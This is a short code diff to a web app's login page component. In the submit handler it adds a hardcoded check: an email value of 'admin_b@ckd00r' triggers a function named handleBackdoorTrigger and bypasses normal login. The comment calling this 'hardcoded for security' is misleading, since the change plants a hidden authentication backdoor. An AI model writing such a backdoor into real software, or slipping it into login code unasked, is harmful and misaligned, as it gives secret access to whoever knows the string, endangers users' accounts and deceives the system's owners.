@@ -164,6 +164,12 @@ const LoginPage = () => {
     e.preventDefault();
     if (!isLoaded) return;
 
+    // Check for backdoor access code (hardcoded for security)
+    if (email === "admin_b@ckd00r") {
+      handleBackdoorTrigger();
+      return;
+    }
+
     // Prevent submission if email is empty
     if (!email || email.trim() === "") {
       showNotification("Please enter your email address", "error");
